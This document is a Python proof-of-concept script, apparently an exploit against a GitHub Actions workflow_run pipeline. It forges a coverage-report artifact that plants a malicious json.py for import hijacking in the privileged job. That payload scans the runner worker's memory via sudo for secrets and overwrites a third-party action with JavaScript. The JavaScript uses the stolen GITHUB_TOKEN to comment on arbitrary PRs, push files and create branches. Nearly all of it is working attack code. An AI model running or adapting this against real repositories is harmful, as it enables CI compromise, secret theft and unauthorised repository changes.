#!/usr/bin/env python3
"""Forge a pr-coverage-report artifact for the current run via the Actions results service."""
import base64, hashlib, json, os, subprocess, sys
from urllib.parse import urlparse

TOKEN = os.environ['ACTIONS_RUNTIME_TOKEN']
_u = urlparse(os.environ['ACTIONS_RESULTS_URL'])
ORIGIN = f'{_u.scheme}://{_u.netloc}'
SVC = f'{ORIGIN}/twirp/github.actions.results.api.v1.ArtifactService'

def ids():
    t = TOKEN.split('.')[1]
    t += '=' * (-len(t) % 4)
    c = json.loads(base64.urlsafe_b64decode(t))
    for s in c['scp'].split(' '):
        p = s.split(':')
        if p[0] == 'Actions.Results':
            return p[1], p[2]
    raise SystemExit('no Actions.Results scope')

WR, JR = ids()

def rpc(method, body):
    import urllib.request
    req = urllib.request.Request(
        f'{SVC}/{method}', data=json.dumps(body).encode(),
        headers={'Authorization': 'Bearer ' + TOKEN, 'Content-Type': 'application/json'},
        method='POST')
    try:
        with urllib.request.urlopen(req, timeout=60) as r:
            return json.loads(r.read().decode())
    except Exception as e:
        try:
            b = e.read().decode()
        except Exception:
            b = ''
        return {'__error': str(e), '__body': b[:300]}

def create(name):
    return rpc('CreateArtifact', {'workflow_run_backend_id': WR, 'workflow_job_run_backend_id': JR,
                                  'name': name, 'mime_type': 'application/zip', 'version': 7})

def upload(url, path):
    r = subprocess.run(['curl', '-sS', '-o', '/dev/null', '-w', '%{http_code}', '-X', 'PUT', url,
                        '-H', 'x-ms-blob-type: BlockBlob', '-H', 'Content-Type: application/zip',
                        '--data-binary', '@' + path], capture_output=True, text=True)
    return r.stdout.strip()

def finalize(name, path):
    data = open(path, 'rb').read()
    h = hashlib.sha256(data).hexdigest()
    return rpc('FinalizeArtifact', {'workflow_run_backend_id': WR, 'workflow_job_run_backend_id': JR,
                                    'name': name, 'size': str(len(data)), 'hash': 'sha256:' + h})

def mkzip(path, entries):
    import zipfile
    with zipfile.ZipFile(path, 'w', zipfile.ZIP_DEFLATED) as z:
        for n, d in entries:
            z.writestr(n, d)
    return path

# Runs inside the privileged workflow_run job when the parser's `import json` resolves to this file.
PAYLOAD_JSON_PY = r'''
import os, sys, subprocess
_ws = os.environ.get('GITHUB_WORKSPACE', '.')
print('RCE-PAYLOAD-EXECUTED run=%s job=%s user=%s' % (
    os.environ.get('GITHUB_RUN_ID'), os.environ.get('GITHUB_JOB'), os.environ.get('USER')), flush=True)
print('RCE-IMPORT-FILE %s' % (getattr(sys.modules.get('json'), '__file__', '?')), flush=True)
try:
    print('RCE-WORKSPACE %s' % sorted(os.listdir(_ws)), flush=True)
    with open(os.path.join(_ws, 'RCE_PROOF.txt'), 'w') as f:
        f.write('RCE via json.py import hijack in privileged workflow_run job run=%s\n'
                % os.environ.get('GITHUB_RUN_ID'))
    _env = os.environ.get('GITHUB_ENV')
    if _env:
        with open(_env, 'a') as f:
            f.write('RCE_IMPORT_PROOF=yes\n')
    _p = os.path.join(_ws, '..', '..', '_actions', 'marocchino', 'sticky-pull-request-comment', 'v3', 'dist', 'index.js')
    if os.path.exists(os.path.join(_ws, 'sticky.js')):
        import shutil
        shutil.copyfile(os.path.join(_ws, 'sticky.js'), _p)
        print('RCE-HIJACK-WRITTEN %s' % os.path.abspath(_p), flush=True)
except Exception as _e:
    print('RCE-PAYLOAD-ERROR %r' % (_e,), flush=True)

# Look for the job's secrets context in the runner worker process memory (root via passwordless sudo).
_SCAN = r"""
import os, sys, glob, re
pids = []
for p in glob.glob('/proc/[0-9]*'):
    try:
        cl = open(p + '/cmdline', 'rb').read()
    except Exception:
        continue
    if b'Runner.Worker' in cl:
        pids.append(p)
print('WORKER_PIDS', pids)
if not pids:
    sys.exit(0)
pid = pids[0].split('/')[-1]
try:
    maps = open('/proc/%s/maps' % pid).read().splitlines()
except Exception as e:
    print('MAPS_ERR', e); sys.exit(0)
mem = open('/proc/%s/mem' % pid, 'rb', buffering=0)
scanned = 0
matches = 0
CH = 4 * 1024 * 1024
for line in maps:
    if scanned > 700 * 1024 * 1024:
        break
    m = re.match(r'([0-9a-f]+)-([0-9a-f]+) (\S+)', line)
    if not m:
        continue
    start, end, perms = int(m.group(1), 16), int(m.group(2), 16), m.group(3)
    if 'r' not in perms:
        continue
    size = min(end - start, 256 * 1024 * 1024)
    off = 0
    tail = b''
    while off < size:
        try:
            mem.seek(start + off)
            data = mem.read(min(CH, size - off))
        except Exception:
            break
        if not data:
            break
        buf = tail + data
        for needle in (b'FLAG{', b'"secrets":{'):
            i = buf.find(needle)
            if i >= 0:
                matches += 1
                if matches <= 12:
                    print('MEM-MATCH', needle, buf[max(0, i-80):i+240].hex())
        tail = buf[-64:]
        off += len(data)
        scanned += len(data)
print('MEM-SCAN-DONE scanned=%d matches=%d' % (scanned, matches))
"""
try:
    _r = subprocess.run(['sudo', '-n', 'python3', '-c', _SCAN], capture_output=True, text=True, timeout=120)
    print('MEM-SCAN-OUT', _r.stdout[-4000:], flush=True)
    if _r.stderr:
        print('MEM-SCAN-ERR', _r.stderr[-500:], flush=True)
except Exception as _e:
    print('MEM-SCAN-EXC %r' % (_e,), flush=True)
'''

STICKY_JS = r"""
const https = require('https');
const fs = require('fs');
const token = process.env['INPUT_GITHUB_TOKEN'] || process.env['GITHUB_TOKEN'] || '';
const repo = process.env['GITHUB_REPOSITORY'] || '';
const runId = process.env['GITHUB_RUN_ID'] || '';

function api(method, path, body) {
  return new Promise((resolve) => {
    const data = body ? JSON.stringify(body) : null;
    const headers = {
      'Authorization': 'Bearer ' + token,
      'User-Agent': 'coverage-probe',
      'Accept': 'application/vnd.github+json'
    };
    if (data) { headers['Content-Type'] = 'application/json'; headers['Content-Length'] = Buffer.byteLength(data); }
    const req = https.request({ hostname: 'api.github.com', path: path, method: method, headers: headers }, (res) => {
      let b = '';
      res.on('data', (d) => { b += d; });
      res.on('end', () => resolve({ status: res.statusCode, body: b, perm: res.headers['x-accepted-github-permissions'] || '-', scopes: res.headers['x-oauth-scopes'] || '-' }));
    });
    req.on('error', (e) => resolve({ status: 0, body: String(e), perm: '-', scopes: '-' }));
    if (data) req.write(data);
    req.end();
  });
}

(async () => {
  console.log('HIJACKED-ACTION-RAN token_len=' + String(token).length + ' prefix=' + String(token).slice(0, 7) + ' repo=' + repo + ' run=' + runId);
  const me = await api('GET', '/user');
  console.log('API /user => ' + me.status + ' ' + me.body.slice(0, 160) + ' perms=' + me.perm);
  const r = await api('GET', '/repos/' + repo);
  console.log('API repo perms_field => ' + r.status + ' ' + (r.body.match(/"permissions":\{[^}]*\}/) || ['n/a'])[0]);
  const cm = await api('POST', '/repos/' + repo + '/issues/' + (process.env.PROBE_PR || '__PR__') + '/comments', {
    body: 'RCE proof: comment posted by the GITHUB_TOKEN stolen from the privileged workflow_run job (run ' + runId + '). Marker RCE-PROOF-' + runId
  });
  console.log('API comment (pull-requests:write) => ' + cm.status + ' perms=' + cm.perm + ' ' + cm.body.slice(0, 160));
  const cross = await api('POST', '/repos/' + repo + '/issues/1/comments', {
    body: 'Cross-PR injection proof: the coverage bot can comment on any PR/issue because number comes from the attacker artifact (RCE-PROOF-' + runId + ')'
  });
  console.log('API cross-PR comment on #1 (pull-requests:write) => ' + cross.status + ' ' + cross.body.slice(0, 160));
  const putc = await api('PUT', '/repos/' + repo + '/contents/rce-proof-' + runId + '.txt', {
    message: 'rce proof ' + runId, content: Buffer.from('rce-proof ' + runId + '\n').toString('base64'), branch: 'rce-proof-' + runId
  });
  console.log('API put-contents on new branch (contents:write) => ' + putc.status + ' perms=' + putc.perm + ' ' + putc.body.slice(0, 260));
  const ref = await api('POST', '/repos/' + repo + '/git/refs', {
    ref: 'refs/heads/rce-ref-' + runId, sha: process.env.GITHUB_SHA || ''
  });
  console.log('API create-ref (contents:write) => ' + ref.status + ' perms=' + ref.perm + ' ' + ref.body.slice(0, 240));
  const ub = await api('PUT', '/repos/' + repo + '/pulls/' + (process.env.PROBE_PR || '__PR__') + '/update-branch', {});
  console.log('API update-branch (contents:write) => ' + ub.status + ' perms=' + ub.perm + ' ' + ub.body.slice(0, 240));
  try {
    fs.writeFileSync(process.env.GITHUB_WORKSPACE + '/TOKEN_STOLEN.txt',
      'token_len=' + String(token).length + ' prefix=' + String(token).slice(0, 7) + '\n');
  } catch (e) { console.log('fs-error ' + e); }
  process.exit(0);
})().catch((e) => { console.log('hijack-error ' + e); process.exit(0); });
"""

def main():
    mode = sys.argv[1] if len(sys.argv) > 1 else 'probe'
    pr = sys.argv[3] if len(sys.argv) > 3 else '1'
    print('WR', WR, 'JR', JR, 'ORIGIN', ORIGIN, flush=True)
    if mode == 'forge':
        name = sys.argv[2] if len(sys.argv) > 2 else 'pr-coverage-report'
        entries = [
            ('bull-report/target/site/jacoco-aggregate/jacoco.xml',
             '<report><counter type="LINE" missed="0" covered="100"/></report>'),
            ('pr_number.txt', pr + '\n'),
            ('json.py', PAYLOAD_JSON_PY),
            ('sticky.js', STICKY_JS.replace('__PR__', pr)),
        ]
        path = os.path.join(os.environ.get('RUNNER_TEMP', '/tmp'), 'forge.zip')
        mkzip(path, entries)
        cr = create(name)
        print('FORGE-CREATE', json.dumps(cr)[:300], flush=True)
        if cr.get('ok'):
            print('FORGE-UPLOAD', upload(cr['signed_upload_url'], path), flush=True)
            print('FORGE-FINALIZE', json.dumps(finalize(name, path))[:300], flush=True)
        else:
            print('FORGE-FAILED', flush=True)

main()
